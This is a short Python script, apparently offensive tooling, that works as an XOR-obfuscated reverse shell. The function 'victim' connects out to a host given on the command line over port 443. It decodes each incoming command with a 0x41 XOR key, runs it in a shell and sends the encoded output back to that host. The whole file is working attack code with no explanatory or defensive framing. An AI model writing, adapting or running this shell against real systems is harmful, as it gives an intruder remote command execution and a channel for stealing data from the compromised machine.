import sys
import socket
import subprocess

def victim():
    RHOST = sys.argv[1]
    RPORT = 443
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect( (RHOST, RPORT) )
    while True:

        # receive XOR encoded data from network socket
        data = s.recv(1024)
    
        # XOR the data again with a '\x41' to get back to normal data
        en_data = bytearray(data)
        for i in range( len(en_data) ):
            en_data[i] ^= 0x41

        # Execute the decoded data as a command.
        # The subprocess module is great because we can PIPE STDOUT/STDERR/STDIN to a variable
        comm = subprocess.Popen(str(en_data), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
        comm.wait()
        STDOUT, STDERR = comm.communicate()   
        print STDERR

        # Encode the output and send to RHOST
        en_STDOUT= bytearray(STDOUT)
        for i in range(len(en_STDOUT)):
            en_STDOUT[i] ^= 0x41
        s.send(en_STDOUT)

    s.close()

def main():
    victim()

if __name__ == "__main__":
    main()
